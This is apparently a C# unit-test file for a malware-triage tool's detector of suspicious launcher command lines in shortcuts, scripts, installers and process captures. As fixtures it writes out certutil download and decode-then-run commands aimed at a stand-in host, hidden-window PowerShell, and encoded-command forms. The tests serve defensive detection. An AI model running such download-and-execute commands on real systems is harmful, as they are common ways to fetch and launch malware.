using System.Text;
using Corvus.Core;
using Corvus.Core.Documents;
using Corvus.Services.Analysis;

namespace Corvus.Tests;

/// <summary>The launcher table: one rule id from the shortcut, script, installer and process views, and no finding for ordinary command lines.</summary>
public sealed class LauncherTests : IDisposable
{
    private const string Rule = "launcher/command-line";

    private readonly TempDir _dir = new();

    public void Dispose() => _dir.Dispose();

    private static IReadOnlyList<Finding> Launcher(FileView? view) => [.. view!.Findings.Where(f => f.Rule == Rule)];

    [Fact]
    public void A_shortcut_whose_arguments_download_with_a_system_tool_names_the_launcher_rule()
    {
        var bytes = ShellLinkTests.Shortcut("/c certutil -urlcache -f http://example.test/a.bin a.bin");
        var found = Launcher(new ShellLinkFileView().Inspect(new FileInput("a.lnk", bytes, Blob.Identify(bytes)), default));
        var f = Assert.Single(found);
        Assert.Equal(("review", "shortcut", "certutil -urlcache URL: names a URL for the URL cache"), (f.Level, f.Source, f.Evidence));
    }

    [Fact]
    public void A_batch_script_that_decodes_with_a_system_tool_names_the_launcher_rule()
    {
        var bytes = Encoding.UTF8.GetBytes("@echo off\r\ncertutil -decode a.b64 a.exe\r\nstart a.exe\r\n");
        var found = Launcher(new ScriptFileView().Inspect(new FileInput("run.cmd", bytes, Blob.Identify(bytes)), default));
        var f = Assert.Single(found);
        Assert.Equal(("review", "script", "certutil -decode: decodes a file"), (f.Level, f.Source, f.Evidence));
    }

    [Fact]
    public void An_installer_program_action_that_downloads_names_the_launcher_rule()
    {
        var bytes = InstallerTests.Fixture("launcher.msi");
        var found = Launcher(new InstallerFileView().Inspect(new FileInput("launcher.msi", bytes, Blob.Identify(bytes)), default));
        var f = Assert.Single(found);
        Assert.Equal(("review", "installer", "certutil -urlcache URL: names a URL for the URL cache"), (f.Level, f.Source, f.Evidence));
    }

    [Fact]
    public void A_process_command_line_that_hides_its_window_names_the_launcher_rule()
    {
        ProcmonSamples.Proc[] table = [new(4300, 900, "powershell.exe", @"C:\Windows\System32\powershell.exe", "powershell.exe -WindowStyle Hidden -File build.ps1")];
        var path = _dir.File("capture.pml");
        File.WriteAllBytes(path, ProcmonSamples.Log([new(0, 11, 1, 1, 0, ProcmonSamples.ProcessCreate(4300, table[0].ImagePath, table[0].CommandLine))], table: table));
        var found = Launcher(new ProcmonFileView().Inspect(FileInput.Open(path), default));
        var f = Assert.Single(found);
        Assert.Equal(("review", "procmon", "powershell -WindowStyle Hidden: runs with a hidden window", "PID 4300"), (f.Level, f.Source, f.Evidence, f.Location));
    }

    [Theory]
    [InlineData("notepad a.txt")]
    [InlineData("certutil -hashfile a.txt SHA256")]
    [InlineData("msiexec /i setup.msi /qn")]
    [InlineData("powershell -File build.ps1")]
    [InlineData("cmd /c echo hello")]
    [InlineData("bitsadmin /list")]
    [InlineData("certutil -urlcache *")]
    public void A_harmless_command_line_matches_no_launcher_shape(string commandLine) => Assert.Empty(Launchers.Match(commandLine));

    [Fact]
    public void A_harmless_command_line_reports_no_launcher_finding_in_the_shortcut_and_script_views()
    {
        var lnk = ShellLinkTests.Shortcut("/c notepad a.txt");
        Assert.Empty(Launcher(new ShellLinkFileView().Inspect(new FileInput("a.lnk", lnk, Blob.Identify(lnk)), default)));
        var script = Encoding.UTF8.GetBytes("@echo off\r\nnotepad a.txt\r\ncertutil -hashfile a.txt SHA256\r\n");
        Assert.Empty(Launcher(new ScriptFileView().Inspect(new FileInput("run.cmd", script, Blob.Identify(script)), default)));
    }

    // about_Pwsh lists -e and -ec as aliases of -EncodedCommand.
    [Theory]
    [InlineData("powershell -e SQBFAFgAIAAoAEcAZQB0AC0ARABhAHQAZQApAA==")]
    [InlineData("pwsh -ec SQBFAFgAIAAoAEcAZQB0AC0ARABhAHQAZQApAA==")]
    [InlineData("powershell.exe -EncodedCommand SQBFAFgAIAAoAEcAZQB0AC0ARABhAHQAZQApAA==")]
    public void Each_documented_form_of_the_encoded_command_option_matches(string commandLine) =>
        Assert.Equal("runs a base64 command", Assert.Single(Launchers.Match(commandLine)).What);

    [Fact]
    public void A_shape_is_read_only_within_its_own_command()
    {
        Assert.Empty(Launchers.Match("certutil -hashfile a.txt & echo -urlcache"));
        Assert.Single(Launchers.Match("echo hi & certutil -urlcache -f http://example.test/a a"));
    }
}
